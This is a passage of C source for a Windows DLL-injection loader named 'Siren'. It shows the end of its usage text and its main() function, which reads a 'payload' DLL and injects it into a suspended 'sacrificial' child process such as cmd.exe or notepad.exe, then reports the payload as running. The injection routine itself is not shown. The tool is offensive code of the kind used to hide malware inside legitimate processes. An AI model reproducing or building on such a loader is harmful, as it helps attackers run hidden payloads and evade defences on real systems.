        "  -s, --spawn <exe>   Sacrificial process (default: cmd.exe)\n"
        "  -a, --args <str>    Arguments for spawned process\n"
        "  -h, --help          Show this help\n"
        "\n"
        "Environment:\n"
        "  SIREN_VERBOSE=1     Same as --verbose\n"
        "\n"
        "Example:\n"
        "  %s payload.dll -v\n"
        "  %s payload.dll --spawn notepad.exe\n"
        "\n",
        SIREN_VERSION_STRING, prog, prog, prog);
}

int main(int argc, char *argv[])
{
    const char *payload_path = NULL;
    const wchar_t *host_exe  = SR_DEFAULT_HOST;
    const wchar_t *host_args = SR_DEFAULT_ARGS;
    wchar_t custom_host[260];
    wchar_t custom_args[512];

    /* Initialize debug log file — always on */
    sr_log_init();
    LOG("=== Siren starting ===");

    /* Check verbose env first */
    {
        char vbuf[2];
        if (GetEnvironmentVariableA("SIREN_VERBOSE", vbuf, sizeof(vbuf)) > 0)
            g_verbose = 1;
    }

    /* Parse args */
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            print_usage(argv[0]);
            return 0;
        } else if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) {
            g_verbose = 1;
        } else if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--spawn") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "Error: %s requires an argument\n", argv[i]);
                return 1;
            }
            MultiByteToWideChar(CP_UTF8, 0, argv[++i], -1, custom_host, 260);
            host_exe = custom_host;
            host_args = L"";  /* no default args for custom process */
        } else if (strcmp(argv[i], "-a") == 0 || strcmp(argv[i], "--args") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "Error: %s requires an argument\n", argv[i]);
                return 1;
            }
            MultiByteToWideChar(CP_UTF8, 0, argv[++i], -1, custom_args, 512);
            host_args = custom_args;
        } else if (argv[i][0] != '-') {
            payload_path = argv[i];
        }
    }

    if (!payload_path) {
        print_usage(argv[0]);
        return 1;
    }

    LOG("Siren %s starting up...", SIREN_VERSION_STRING);

    size_t dll_size  = 0;
    void  *dll_bytes = read_file(payload_path, &dll_size);
    if (!dll_bytes) {
        ERR("Failed to read payload");
        return 1;
    }

    BOOL injected = inject_suspended_child(dll_bytes, dll_size, host_exe, host_args);

    free(dll_bytes);

    if (injected) {
        OK("Success — payload injected and running");
        return 0;
    } else {
        ERR("Injection failed");
        return 1;
    }
}